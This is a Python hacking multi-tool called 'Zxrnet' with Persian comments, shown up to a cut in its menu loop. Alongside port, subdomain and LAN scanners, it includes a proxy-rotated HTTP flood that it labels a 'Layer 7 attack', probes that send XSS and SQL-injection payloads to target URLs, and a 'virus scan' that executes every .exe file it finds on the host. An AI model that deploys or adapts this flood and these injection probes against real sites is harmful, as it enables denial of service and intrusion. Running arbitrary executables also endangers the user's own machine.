import sys
import subprocess
import importlib
import os
import signal
import threading
import queue
import random
import string
import socket
import time
import json
import webbrowser
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import platform
import re
from urllib.parse import urlparse
import multiprocessing

# لیست کتابخانه‌های مورد نیاز
REQUIRED_LIBRARIES = [
    "requests", "termcolor", "tqdm", "prettytable", "psutil", "art", "dnspython"
]

def install_library(library):
    """نصب خودکار کتابخانه‌ها"""
    try:
        importlib.import_module(library)
    except ImportError:
        print(f"[*] Installing {library}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", library])
        print(f"[+] {library} installed successfully!")

def ensure_libraries():
    """بررسی و نصب کتابخانه‌های مورد نیاز"""
    for lib in REQUIRED_LIBRARIES:
        install_library(lib)

# نصب کتابخانه‌ها در ابتدای اجرا
ensure_libraries()

# وارد کردن کتابخانه‌ها پس از نصب
import requests
from termcolor import colored
from tqdm import tqdm
from prettytable import PrettyTable
import psutil
import art
import dns.resolver

# تابع ساده برای لاگ‌گیری
def log_message(message):
    with open("zxrnet.log", "a") as f:
        f.write(f"[{datetime.now()}] {message}\n")

# دیتابیس پورت‌ها و سرویس‌ها
SERVICE_PORTS = {
    21: "FTP", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
    110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB", 3389: "RDP",
    8080: "HTTP-Alt", 3306: "MySQL", 5432: "PostgreSQL"
}

# دیتابیس بک‌دورها
BACKDOOR_PORTS = {
    1234: "Netcat Backdoor", 2000: "Back Orifice", 31337: "Back Orifice 2000",
    4444: "Metasploit Default", 5555: "Android ADB Backdoor", 6666: "Common Trojan"
}

# منابع معتبر پروکسی
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://www.proxy-list.download/api/v1/get?type=http"
]

# وردلیست‌های بزرگ برای ساب‌دامین
SUBDOMAIN_WORDLISTS = [
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt",
    "https://raw.githubusercontent.com/rbsec/dnscan/master/subdomains-10000.txt"
]

class Zxrnet:
    def __init__(self):
        """سازنده کلاس Zxrnet با تنظیمات اولیه"""
        self.author = "@amirzxrtop"
        self.version = "7.0.0"
        self.proxies = []
        self.working_proxies = {"http": []}
        self.results_queue = queue.Queue()
        self.backdoor_queue = queue.Queue()
        self.virus_queue = queue.Queue()
        self.subdomain_queue = queue.Queue()
        self.vuln_queue = queue.Queue()
        self.related_domain_queue = queue.Queue()
        self.lan_queue = queue.Queue()
        self.config_file = "zxrnet_config.json"
        self.exit_link = "https://t.me/Assasins_Official"
        self.subdomain_file = "subdomains.txt"
        self.cache = {}  # کش عمومی برای همه درخواست‌ها
        self.max_threads = min(multiprocessing.cpu_count() * 10, 100)  # تطبیقی با CPU
        self.load_config()
        self.clear_screen()
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        """مدیریت سیگنال Ctrl+C"""
        print(colored("\n[!] Ctrl+C detected! Saving config and exiting...", "yellow", attrs=["bold"]))
        self.save_config()
        self.open_exit_link()
        sys.exit(0)

    def clear_screen(self):
        """پاک کردن صفحه کنسول"""
        os.system('cls' if platform.system() == 'Windows' else 'clear')

    def load_config(self):
        """بارگذاری تنظیمات از فایل JSON"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    self.config = json.load(f)
                self.proxies = self.config.get("proxies", [])
                self.working_proxies = self.config.get("working_proxies", {"http": []})
                print(colored("[+] Configuration loaded successfully", "green", attrs=["bold"]))
                log_message("Config loaded successfully")
            else:
                self.config = {
                    "proxies": [],
                    "working_proxies": {"http": []},
                    "settings": {"threads": self.max_threads, "timeout": 5, "max_retries": 3}
                }
                self.save_config()
                print(colored("[+] New configuration file created", "yellow", attrs=["bold"]))
                log_message("New config file created")
        except Exception as e:
            print(colored(f"[-] Error loading config: {e}", "red", attrs=["bold"]))
            log_message(f"Error loading config: {e}")

    def save_config(self):
        """ذخیره تنظیمات در فایل JSON"""
        try:
            self.config["proxies"] = self.proxies
            self.config["working_proxies"] = self.working_proxies
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
            print(colored("[+] Configuration saved successfully", "green", attrs=["bold"]))
            log_message("Config saved successfully")
        except Exception as e:
            print(colored(f"[-] Error saving config: {e}", "red", attrs=["bold"]))
            log_message(f"Error saving config: {e}")

    def banner(self):
        """نمایش بنر اصلی ابزار با ظاهر زیبا"""
        print(colored(art.text2art("Zxrnet", font="block"), "cyan", attrs=["bold"]))
        banner_text = f"""
        {'='*70}
        | Created by: {self.author} | Version: {self.version}           |
        | Telegram: https://t.me/amirzxrtop                       |
        | Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}        |
        | Platform: {platform.system()} | Max Threads: {self.max_threads} |
        {'='*70}
        """
        print(colored(banner_text, "cyan", attrs=["bold"]))

    def validate_ip(self, ip):
        """اعتبارسنجی آدرس IP"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def validate_port(self, port):
        """اعتبارسنجی پورت"""
        try:
            port = int(port)
            if 1 <= port <= 65535:
                return True
            print(colored("[-] Port must be between 1 and 65535!", "red", attrs=["bold"]))
            return False
        except ValueError:
            print(colored("[-] Port must be a valid integer!", "red", attrs=["bold"]))
            return False

    def validate_port_range(self, port_range_input):
        """اعتبارسنجی محدوده پورت‌ها"""
        try:
            start, end = map(int, port_range_input.split("-"))
            if 1 <= start <= end <= 65535:
                return (start, end)
            print(colored("[-] Ports must be between 1-65535 and start <= end!", "red", attrs=["bold"]))
            return None
        except ValueError:
            print(colored("[-] Invalid port range format! Use 'start-end' (e.g., 1-1000)", "red", attrs=["bold"]))
            return None

    def generate_password_list(self, length=12, count=5000, custom_words=None):
        """تولید لیست رمزعبور"""
        self.banner()
        print(colored(f"[*] Generating {count} passwords of length {length}...", "yellow", attrs=["bold"]))
        passwords = set()
        characters = string.ascii_letters + string.digits + string.punctuation
        custom_words = custom_words.split() if custom_words else []
        filename = f"passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        with tqdm(total=count, desc="Generating Passwords", colour="green") as pbar:
            while len(passwords) < count:
                if custom_words and random.random() > 0.5:
                    base = random.choice(custom_words)
                    pwd = base + ''.join(random.choice(characters) for _ in range(max(0, length - len(base))))
                else:
                    pwd = ''.join(random.choice(characters) for _ in range(length))
                passwords.add(pwd)
                pbar.update(1)

        try:
            with open(filename, 'w') as f:
                f.write("\n".join(passwords))
            print(colored(f"[+] Password list saved to {filename}", "green", attrs=["bold"]))
            self.generate_report(f"Generated {count} passwords and saved to {filename}")
        except Exception as e:
            print(colored(f"[-] Error saving password list: {e}", "red", attrs=["bold"]))
            log_message(f"Error saving password list: {e}")

    def fetch_proxies(self):
        """دریافت پروکسی‌ها از منابع آنلاین"""
        self.banner()
        print(colored("[*] Fetching proxies from multiple sources...", "yellow", attrs=["bold"]))
        total_collected = 0

        for url in PROXY_SOURCES:
            try:
                if url in self.cache:
                    new_proxies = self.cache[url]
                else:
                    response = requests.get(url, timeout=self.config["settings"]["timeout"])
                    if response.status_code == 200:
                        new_proxies = response.text.splitlines()
                        self.cache[url] = new_proxies
                    else:
                        continue
                self.proxies.extend(new_proxies)
                total_collected += len(new_proxies)
                print(colored(f"[+] Collected {len(new_proxies)} proxies from {url}", "cyan", attrs=["bold"]))
            except Exception as e:
                print(colored(f"[-] Error fetching proxies from {url}: {e}", "red", attrs=["bold"]))
                log_message(f"Error fetching proxies from {url}: {e}")

        print(colored(f"[+] Total proxies collected: {total_collected}", "green", attrs=["bold"]))
        self.save_config()
        self.generate_report(f"Fetched {total_collected} proxies")

    def test_proxy(self, proxy, proxy_type):
        """تست یک پروکسی"""
        proxy_dict = {proxy_type: f"{proxy_type}://{proxy}"}
        start_time = time.time()
        try:
            response = requests.get("http://www.google.com", proxies=proxy_dict, timeout=self.config["settings"]["timeout"])
            if response.status_code == 200:
                latency = (time.time() - start_time) * 1000
                return (proxy, latency)
            return None
        except Exception:
            return None

    def test_all_proxies(self, threads=None):
        """تست همه پروکسی‌ها"""
        self.banner()
        if not self.proxies:
            print(colored("[-] No proxies available to test!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Testing {len(self.proxies)} proxies with {threads} threads...", "yellow", attrs=["bold"]))
        proxy_types = ["http"]

        with tqdm(total=len(self.proxies), desc="Testing Proxies", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [executor.submit(self.test_proxy, proxy, proxy_types[0]) for proxy in self.proxies]
                for future in futures:
                    result = future.result()
                    if result:
                        proxy, latency = result
                        self.working_proxies[proxy_types[0]].append((proxy, latency))
                    pbar.update(1)

        table = PrettyTable(["Proxy", "Type", "Latency (ms)"])
        for ptype, proxies in self.working_proxies.items():
            for proxy, latency in proxies:
                table.add_row([proxy, ptype, f"{latency:.2f}"])
            print(colored(f"[+] Found {len(proxies)} working {ptype} proxies", "green", attrs=["bold"]))
            with open(f"working_{ptype}_proxies.txt", "w") as f:
                f.write("\n".join([p[0] for p in proxies]))

        print(table)
        self.save_config()
        self.generate_report(f"Tested {len(self.proxies)} proxies")

    def scan_port(self, target, port, protocol="tcp"):
        """اسکن یک پورت خاص"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "tcp" else socket.SOCK_DGRAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                service = SERVICE_PORTS.get(port, "Unknown")
                banner = self.grab_banner(target, port, protocol)
                self.results_queue.put((port, protocol.upper(), "open", service, banner or "No banner"))
            sock.close()
        except Exception as e:
            log_message(f"Error scanning port {port}: {e}")

    def grab_banner(self, target, port, protocol):
        """دریافت بنر از پورت"""
        try:
            if protocol == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target, port))
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                return banner if banner else None
            return None
        except Exception:
            return None

    def scan_ports(self, target, port_range=(1, 1000), threads=None):
        """اسکن پورت‌ها در یک محدوده"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("[-] Invalid IP address!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning ports on {target} ({port_range[0]}-{port_range[1]}) with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Port", "Protocol", "Status", "Service", "Banner"])
        total_ports = (port_range[1] - port_range[0] + 1) * 2

        with tqdm(total=total_ports, desc="Scanning Ports", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in range(port_range[0], port_range[1] + 1):
                    executor.submit(self.scan_port, target, port, "tcp")
                    executor.submit(self.scan_port, target, port, "udp")
                    pbar.update(2)

        open_ports = 0
        while not self.results_queue.empty():
            port, protocol, status, service, banner = self.results_queue.get()
            if status == "open":
                table.add_row([port, protocol, colored(status, "green", attrs=["bold"]), service, banner])
                open_ports += 1

        if open_ports > 0:
            print(table)
        else:
            print(colored("[!] No open ports found!", "yellow", attrs=["bold"]))
        self.generate_report(f"Scanned ports on {target}. Found {open_ports} open ports")

    def scan_backdoor(self, target, port, protocol="tcp"):
        """اسکن پورت برای بک‌دور"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "tcp" else socket.SOCK_DGRAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                banner = self.grab_banner(target, port, protocol)
                backdoor_name = BACKDOOR_PORTS.get(port, "Unknown Backdoor")
                self.backdoor_queue.put((port, protocol.upper(), "open", backdoor_name, banner or "No banner"))
            sock.close()
        except Exception as e:
            log_message(f"Error scanning backdoor port {port}: {e}")

    def scan_backdoors(self, target, threads=None):
        """اسکن بک‌دورها"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("[-] Invalid IP address!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning for backdoors on {target} with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Port", "Protocol", "Status", "Backdoor Name", "Banner"])
        total_ports = len(BACKDOOR_PORTS) * 2

        with tqdm(total=total_ports, desc="Scanning Backdoors", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in BACKDOOR_PORTS.keys():
                    executor.submit(self.scan_backdoor, target, port, "tcp")
                    executor.submit(self.scan_backdoor, target, port, "udp")
                    pbar.update(2)

        open_backdoors = 0
        while not self.backdoor_queue.empty():
            port, protocol, status, backdoor_name, banner = self.backdoor_queue.get()
            if status == "open":
                table.add_row([port, protocol, colored(status, "green", attrs=["bold"]), backdoor_name, banner])
                open_backdoors += 1

        if open_backdoors > 0:
            print(colored("[!] WARNING: Potential backdoors detected!", "red", attrs=["bold"]))
            print(table)
        else:
            print(colored("[+] No backdoors detected!", "green", attrs=["bold"]))
        self.generate_report(f"Scanned backdoors on {target}. Found {open_backdoors} potential backdoors")

    def scan_virus(self, file_path=None):
        """اسکن ویروس"""
        self.banner()
        if file_path:
            if not os.path.exists(file_path) or not file_path.lower().endswith(".exe"):
                print(colored("[-] Invalid file path or not an .exe!", "red", attrs=["bold"]))
                return
            self.analyze_file(file_path)
        else:
            self.scan_system_for_exe()

    def scan_system_for_exe(self):
        """اسکن سیستم برای فایل‌های اجرایی"""
        exe_files = []
        print(colored("[*] Scanning system for .exe files...", "yellow", attrs=["bold"]))
        drives = ['C:\\'] if platform.system() == "Windows" else ['/']
        for drive in drives:
            for root, _, files in os.walk(drive):
                for file in files:
                    if file.lower().endswith(".exe"):
                        exe_files.append(os.path.join(root, file))

        print(colored(f"[+] Found {len(exe_files)} .exe files. Analyzing...", "yellow", attrs=["bold"]))
        with tqdm(total=len(exe_files), desc="Analyzing Files", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=5) as executor:
                executor.map(self.analyze_file, exe_files)
                pbar.update(len(exe_files))

        self.display_virus_results()

    def analyze_file(self, file_path):
        """تحلیل فایل برای ویروس"""
        try:
            process = subprocess.Popen([file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
            start_time = time.time()
            suspicious = False
            behavior_score = 0

            while time.time() - start_time < 5:
                cpu_usage = psutil.Process(process.pid).cpu_percent(interval=0.1)
                if cpu_usage > 80:
                    behavior_score += 30
                connections = psutil.Process(process.pid).net_connections()
                if connections:
                    behavior_score += 50
                time.sleep(0.5)

            process.terminate()
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()

            if behavior_score > 50:
                suspicious = True
            self.virus_queue.put((file_path, suspicious, behavior_score))
        except Exception as e:
            log_message(f"Error analyzing {file_path}: {e}")

    def display_virus_results(self):
        """نمایش نتایج اسکن ویروس"""
        table = PrettyTable(["File Path", "Suspicious", "Behavior Score"])
        suspicious_count = 0

        while not self.virus_queue.empty():
            file_path, suspicious, score = self.virus_queue.get()
            status = colored("Yes", "red", attrs=["bold"]) if suspicious else colored("No", "green", attrs=["bold"])
            table.add_row([file_path, status, score])
            if suspicious:
                suspicious_count += 1

        if suspicious_count > 0:
            print(colored("[!] WARNING: Potential viruses detected!", "red", attrs=["bold"]))
            print(table)
        else:
            print(colored("[+] No suspicious files detected!", "green", attrs=["bold"]))
        self.generate_report(f"Scanned for viruses. Found {suspicious_count} suspicious files")

    def layer7_stress(self, target, duration=60, threads=None, use_proxies=True):
        """استرسر لایه 7"""
        self.banner()
        threads = threads or self.max_threads
        print(colored(f"[*] Starting Layer 7 attack on {target} for {duration} seconds with {threads} threads...", "red", attrs=["bold"]))
        end_time = time.time() + duration
        requests_sent = 0

        def flood():
            nonlocal requests_sent
            headers = {"User-Agent": random.choice(["Mozilla/5.0", "Chrome/90.0", "Safari/537.36"])}
            while time.time() < end_time:
                try:
                    proxy = random.choice([p[0] for p in self.working_proxies["http"]]) if use_proxies and self.working_proxies["http"] else None
                    proxies = {"http": f"http://{proxy}"} if proxy else None
                    requests.get(target, headers=headers, proxies=proxies, timeout=5)
                    requests_sent += 1
                except:
                    pass

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))

        print(colored(f"[+] Layer 7 attack completed. Sent {requests_sent} requests.", "green", attrs=["bold"]))
        self.generate_report(f"Layer 7 attack on {target} for {duration}s. Sent {requests_sent} requests")

    def download_subdomain_list(self):
        """دانلود وردلیست ساب‌دامین از منابع معتبر"""
        self.banner()
        print(colored("[*] Downloading subdomain wordlist from GitHub...", "yellow", attrs=["bold"]))
        url = random.choice(SUBDOMAIN_WORDLISTS)
        try:
            if url in self.cache:
                content = self.cache[url]
            else:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    content = response.text
                    self.cache[url] = content
                else:
                    raise Exception(f"HTTP {response.status_code}")
            with open(self.subdomain_file, "w") as f:
                f.write(content)
            print(colored(f"[+] Subdomain wordlist saved to {self.subdomain_file}", "green", attrs=["bold"]))
            log_message(f"Downloaded subdomain wordlist from {url}")
        except Exception as e:
            print(colored(f"[-] Error downloading subdomain list: {e}", "red", attrs=["bold"]))
            log_message(f"Error downloading subdomain list: {e}")

    def check_subdomain(self, domain, subdomain):
        """بررسی وجود ساب‌دامین با DNS و کش"""
        full_domain = f"{subdomain}.{domain}"
        if full_domain in self.cache:
            if self.cache[full_domain]:
                self.subdomain_queue.put((full_domain, self.cache[full_domain]))
            return

        try:
            answers = dns.resolver.resolve(full_domain, 'A')
            for rdata in answers:
                ip = str(rdata)
                self.cache[full_domain] = ip
                self.subdomain_queue.put((full_domain, ip))
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
            self.cache[full_domain] = None
        except Exception as e:
            log_message(f"Error checking subdomain {full_domain}: {e}")
            self.cache[full_domain] = None

    def enumerate_subdomains(self, domain, threads=None, limit=10000):
        """پیدا کردن ساب‌دامین‌ها"""
        self.banner()
        if not domain:
            print(colored("[-] Domain is required!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        if not os.path.exists(self.subdomain_file):
            print(colored("[-] Subdomain wordlist not found! Downloading...", "yellow", attrs=["bold"]))
            self.download_subdomain_list()

        with open(self.subdomain_file, "r") as f:
            subdomains = [line.strip() for line in f if line.strip()][:limit]

        print(colored(f"[*] Enumerating subdomains for {domain} with {threads} threads...", "yellow", attrs=["bold"]))
        total_subdomains = len(subdomains)
        found_subdomains = 0

        table = PrettyTable(["Subdomain", "IP Address"])
        result_file = f"subdomains_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        with tqdm(total=total_subdomains, desc="Enumerating Subdomains", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for subdomain in subdomains:
                    executor.submit(self.check_subdomain, domain, subdomain)
                    pbar.update(1)

        while not self.subdomain_queue.empty():
            subdomain, ip = self.subdomain_queue.get()
            table.add_row([subdomain, ip])
            found_subdomains += 1
            with open(result_file, "a") as f:
                f.write(f"{subdomain}: {ip}\n")

        if found_subdomains > 0:
            print(colored(f"[+] Found {found_subdomains} subdomains!", "green", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[!] No subdomains found!", "yellow", attrs=["bold"]))
        self.generate_report(f"Enumerated subdomains for {domain}. Found {found_subdomains} subdomains")

    def check_vulnerability(self, url, vuln_type):
        """بررسی آسیب‌پذیری‌های وب"""
        payloads = {
            "XSS": ["<script>alert('xss')</script>", "'><script>alert(1)</script>"],
            "SQLi": ["' OR 1=1 --", "1' UNION SELECT NULL, NULL --"]
        }
        try:
            if vuln_type == "XSS":
                for payload in payloads["XSS"]:
                    response = requests.get(url + "?q=" + payload, timeout=5)
                    if payload in response.text:
                        self.vuln_queue.put((url, "XSS", payload))
            elif vuln_type == "SQLi":
                for payload in payloads["SQLi"]:
                    response = requests.get(url + "?id=" + payload, timeout=5)
                    if "mysql" in response.text.lower() or "sql" in response.text.lower():
                        self.vuln_queue.put((url, "SQL Injection", payload))
        except Exception as e:
            log_message(f"Error checking vulnerability {vuln_type} on {url}: {e}")

    def scan_vulnerabilities(self, url, threads=None):
        """اسکن آسیب‌پذیری‌های وب"""
        self.banner()
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            print(colored("[-] Invalid URL! Use format: http://example.com", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning vulnerabilities on {url} with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["URL", "Vulnerability", "Payload"])
        vuln_types = ["XSS", "SQLi"]
        total_checks = len(vuln_types)

        with tqdm(total=total_checks, desc="Scanning Vulnerabilities", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for vuln_type in vuln_types:
                    executor.submit(self.check_vulnerability, url, vuln_type)
                    pbar.update(1)

        found_vulns = 0
        result_file = f"vulns_{parsed_url.netloc}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        while not self.vuln_queue.empty():
            url, vuln_type, payload = self.vuln_queue.get()
            table.add_row([url, vuln_type, payload])
            found_vulns += 1
            with open(result_file, "a") as f:
                f.write(f"{url} - {vuln_type}: {payload}\n")

        if found_vulns > 0:
            print(colored(f"[!] Found {found_vulns} vulnerabilities!", "red", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[+] No vulnerabilities found!", "green", attrs=["bold"]))
        self.generate_report(f"Scanned vulnerabilities on {url}. Found {found_vulns} vulnerabilities")

    def fingerprint_web(self, url):
        """فینگرپرینتینگ وب"""
        self.banner()
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            print(colored("[-] Invalid URL! Use format: http://example.com", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Fingerprinting {url}...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Technology", "Version"])
        headers_to_check = {
            "Server": None,
            "X-Powered-By": None,
            "X-Generator": None
        }

        try:
            if url in self.cache:
                response = self.cache[url]
            else:
                response = requests.get(url, timeout=5)
                self.cache[url] = response
            headers = response.headers
            content = response.text.lower()

            for header in headers_to_check:
                if header in headers:
                    table.add_row([header, headers[header]])

            if "wordpress" in content:
                version = re.search(r'wordpress\s*(\d+\.\d+\.\d+)?', content)
                table.add_row(["WordPress", version.group(1) if version else "Unknown"])
            if "drupal" in content:
                version = re.search(r'drupal\s*(\d+)?', content)
                table.add_row(["Drupal", version.group(1) if version else "Unknown"])
            if "joomla" in content:
                version = re.search(r'joomla\s*(\d+\.\d+\.\d+)?', content)
                table.add_row(["Joomla", version.group(1) if version else "Unknown"])

            print(table)
            self.generate_report(f"Fingerprinted {url}. Detected technologies: {len(table._rows)}")
        except Exception as e:
            print(colored(f"[-] Error fingerprinting {url}: {e}", "red", attrs=["bold"]))
            log_message(f"Error fingerprinting {url}: {e}")

    def check_related_domain(self, domain):
        """بررسی دامنه‌های مرتبط با استفاده از Reverse IP Lookup"""
        try:
            answers = dns.resolver.resolve(domain, 'A')
            ip = str(answers[0])
            if ip in self.cache:
                domains = self.cache[ip]
            else:
                response = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=5)
                domains = response.text.splitlines()
                self.cache[ip] = domains
            for related_domain in domains:
                if related_domain != domain:
                    self.related_domain_queue.put((related_domain, ip))
        except Exception as e:
            log_message(f"Error checking related domains for {domain}: {e}")

    def scan_related_domains(self, domain, threads=None):
        """اسکن دامنه‌های مرتبط"""
        self.banner()
        if not domain:
            print(colored("[-] Domain is required!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning related domains for {domain} with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Related Domain", "IP Address"])
        self.check_related_domain(domain)

        with tqdm(total=1, desc="Scanning Related Domains", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                executor.submit(self.check_related_domain, domain)
                pbar.update(1)

        found_domains = 0
        result_file = f"related_domains_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        while not self.related_domain_queue.empty():
            related_domain, ip = self.related_domain_queue.get()
            table.add_row([related_domain, ip])
            found_domains += 1
            with open(result_file, "a") as f:
                f.write(f"{related_domain}: {ip}\n")

        if found_domains > 0:
            print(colored(f"[+] Found {found_domains} related domains!", "green", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[!] No related domains found!", "yellow", attrs=["bold"]))
        self.generate_report(f"Scanned related domains for {domain}. Found {found_domains} domains")

    def simple_pentest(self, url):
        """تست نفوذ ساده با بررسی هدرهای امنیتی"""
        self.banner()
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            print(colored("[-] Invalid URL! Use format: http://example.com", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Performing simple pentest on {url}...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Check", "Status", "Details"])
        try:
            if url in self.cache:
                response = self.cache[url]
            else:
                response = requests.get(url, timeout=5)
                self.cache[url] = response
            headers = response.headers

            # بررسی هدرهای امنیتی
            if "X-Frame-Options" not in headers:
                table.add_row(["X-Frame-Options", colored("Missing", "red", attrs=["bold"]), "Vulnerable to Clickjacking"])
            else:
                table.add_row(["X-Frame-Options", colored("Present", "green", attrs=["bold"]), headers["X-Frame-Options"]])

            if "Content-Security-Policy" not in headers:
                table.add_row(["CSP", colored("Missing", "red", attrs=["bold"]), "No Content Security Policy"])
            else:
                table.add_row(["CSP", colored("Present", "green", attrs=["bold"]), "Policy exists"])

            if "X-Content-Type-Options" not in headers or headers["X-Content-Type-Options"] != "nosniff":
                table.add_row(["X-Content-Type-Options", colored("Missing/Incorrect", "red", attrs=["bold"]), "MIME sniffing possible"])
            else:
                table.add_row(["X-Content-Type-Options", colored("Present", "green", attrs=["bold"]), "nosniff"])

            print(table)
            self.generate_report(f"Performed simple pentest on {url}. Checked {len(table._rows)} security headers")
        except Exception as e:
            print(colored(f"[-] Error during pentest: {e}", "red", attrs=["bold"]))
            log_message(f"Error during pentest on {url}: {e}")

    def scan_lan_device(self, ip):
        """اسکن دستگاه‌های شبکه محلی"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 80))  # تست پورت 80 برای سرعت
            if result == 0:
                self.lan_queue.put(ip)
            sock.close()
        except Exception:
            pass

    def scan_lan(self, threads=None):
        """اسکن شبکه محلی"""
        self.banner()
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning local network with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["IP Address"])
        local_ip = socket.gethostbyname(socket.gethostname())
        base_ip = ".".join(local_ip.split(".")[:-1]) + "."

        ip_list = [base_ip + str(i) for i in range(1, 255)]
        total_ips = len(ip_list)

        with tqdm(total=total_ips, desc="Scanning LAN", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for ip in ip_list:
                    executor.submit(self.scan_lan_device, ip)
                    pbar.update(1)

        found_devices = 0
        result_file = f"lan_devices_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        while not self.lan_queue.empty():
            ip = self.lan_queue.get()
            table.add_row([ip])
            found_devices += 1
            with open(result_file, "a") as f:
                f.write(f"{ip}\n")

        if found_devices > 0:
            print(colored(f"[+] Found {found_devices} devices in LAN!", "green", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[!] No devices found in LAN!", "yellow", attrs=["bold"]))
        self.generate_report(f"Scanned LAN. Found {found_devices} devices")

    def generate_report(self, message):
        """تولید گزارش"""
        try:
            with open("zxrnet_report.txt", "a") as f:
                f.write(f"[{datetime.now()}] {message}\n")
            log_message(message)
        except Exception as e:
            print(colored(f"[-] Error writing report: {e}", "red", attrs=["bold"]))
            log_message(f"Error writing report: {e}")

    def open_exit_link(self):
        """باز کردن لینک خروج"""
        try:
            webbrowser.open(self.exit_link)
        except Exception:
            if platform.system() == "Windows":
                os.system(f"start {self.exit_link}")
            elif platform.system() == "Linux":
                os.system(f"xdg-open {self.exit_link} || termux-open-url {self.exit_link}")
            else:
                os.system(f"termux-open-url {self.exit_link} || xdg-open {self.exit_link}")

    def display_menu(self):
        """نمایش منوی اصلی"""
        self.banner()
        options = [
            "1. Generate Password List",
            "2. Fetch Proxies",
            "3. Test Proxies",
            "4. Scan Ports",
            "5. Scan Backdoors",
            "6. Scan Virus",
            "7. Layer 7 Stress",
            "8. Enumerate Subdomains",
            "9. Scan Web Vulnerabilities",
            "10. Web Fingerprinting",
            "11. Scan Related Domains",
            "12. Simple Pentest",
            "13. Scan LAN",
            "14. Exit"
        ]
        print(colored("Available Options:", "cyan", attrs=["bold"]))
        print("\n".join(colored(opt, "cyan", attrs=["bold"]) for opt in options))

    def get_user_input(self, prompt, default=None):
        """دریافت ورودی کاربر"""
        value = input(colored(f"{prompt} [{'default' if default else 'required'}]: ", "yellow", attrs=["bold"]))
        return value if value else default

    def run(self):
        """اجرای حلقه اصلی"""
        while True:
            self.display_menu()
            choice = self.get_user_input("Select an option", None)

            try:
                if choice == "1":
                    length = int(self.get_user_input("Password length", "12"))
                    count = int(self.get_user_input("Number of passwords", "5000"))
                    custom_words = self.get_user_input("Custom words (space-separated)", None)
                    self.generate_password_list(length, count, custom_words)

